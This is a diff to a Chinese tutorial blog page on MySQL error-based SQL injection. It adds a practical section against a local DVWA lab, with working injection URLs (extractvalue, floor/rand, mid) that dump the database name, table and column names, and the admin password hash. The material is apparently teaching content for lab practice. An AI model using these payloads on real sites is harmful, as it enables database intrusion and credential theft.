@@ -143,7 +143,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    839 字
+                    1.3k 字
                   </span>
                 
 
@@ -153,7 +153,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    10
+                    17
                      分钟
                   </span>
                 
@@ -183,7 +183,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年1月17日 下午
+                  本文最后更新于：2021年1月17日 晚上
                 
               </p>
             
@@ -207,6 +207,22 @@ floor(rand(0)*2):对应的有规律数列为 011011...</code></pre>
 <h4 id="注入SQL：-2"><a href="#注入SQL：-2" class="headerlink" title="注入SQL："></a>注入SQL：</h4><pre><code class="hljs plain">?id&#x3D;2&#39; and updatexml(1, concat(0x7e (select @@version))) --&#39;</code></pre>
 
 <h3 id="4、exp-函数"><a href="#4、exp-函数" class="headerlink" title="4、exp()函数"></a>4、exp()函数</h3><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><p>～():取反函数，例如一个正数取反，会变成一个负数，负数用数字形式表示是一个很庞大的数字，传入exp会导致exp函数无法处理从而报错，如下图：<br><img src="/img/sql/errorbase/error3.png" srcset="/img/loading.gif" alt="fileupload"><br>注意，exp()产生错误，只会返回执行语句的表达式，需要联合后端脚本语言进行解析，从而返回相应的执行结果</p>
+<h2 id="报错注入实战"><a href="#报错注入实战" class="headerlink" title="报错注入实战"></a>报错注入实战</h2><h3 id="使用extractvalue-函数获取用户和数据库名"><a href="#使用extractvalue-函数获取用户和数据库名" class="headerlink" title="使用extractvalue()函数获取用户和数据库名"></a>使用extractvalue()函数获取用户和数据库名</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, concat(0x7e, user(), 0x7e,database())) -- &amp;Submit&#x3D;Submit#</code></pre>
+<p><img src="/img/sql/errorbase/error4.png" srcset="/img/loading.gif" alt="fileupload"></p>
+<h3 id="使用floor函数获取用户表名"><a href="#使用floor函数获取用户表名" class="headerlink" title="使用floor函数获取用户表名"></a>使用floor函数获取用户表名</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39; limit 2, 1),&#39;|&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#</code></pre>
+<p><img src="/img/sql/errorbase/error5.png" srcset="/img/loading.gif" alt="fileupload"></p>
+<h3 id="使用extractvalue-函数获取用户表字段"><a href="#使用extractvalue-函数获取用户表字段" class="headerlink" title="使用extractvalue()函数获取用户表字段"></a>使用extractvalue()函数获取用户表字段</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, concat(0x7e, (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 3,1))) -- &amp;Submit&#x3D;Submit#</code></pre>
+<p><img src="/img/sql/errorbase/error8.png" srcset="/img/loading.gif" alt="fileupload"></p>
+<h3 id="使用floor函数获取用户名密码"><a href="#使用floor函数获取用户名密码" class="headerlink" title="使用floor函数获取用户名密码"></a>使用floor函数获取用户名密码</h3><pre><code class="hljs plain">http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select user from dvwa.users limit 0,1),&#39;|&#39;,    floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#
+
+http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; union select 1,2 from (select count(*), concat((select password from dvwa.users limit 0,1),&#39;|&#39;,    floor(rand(0)*2))x from information_schema.tables group by x)a -- &amp;Submit&#x3D;Submit#</code></pre>
+<p><img src="/img/sql/errorbase/error6.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/errorbase/error7.png" srcset="/img/loading.gif" alt="fileupload"></p>
+<p>⚠️注意：使用extractvalue函数获取密码时，最大长度为32位，密码hash很有可能被截断，导致获取不全，需要结合mid函数获取。</p>
+<pre><code class="hljs plain"># 第一次获取前29位
+http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),1,29)) -- &amp;Submit&#x3D;Submit#
+# 第二次从第29位获取29位
+http:&#x2F;&#x2F;127.0.0.1:8881&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;&#39; and extractvalue(1, mid(concat(0x7e,(select password from dvwa.users limit 0,1)),29,29)) -- &amp;Submit&#x3D;Submit#</code></pre>
+<p><img src="/img/sql/errorbase/error9.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/sql/errorbase/error10.png" srcset="/img/loading.gif" alt="fileupload"><br>两次结果拼接和floor函数取出的admin密码一致。</p>
 
             </article>
             <hr>
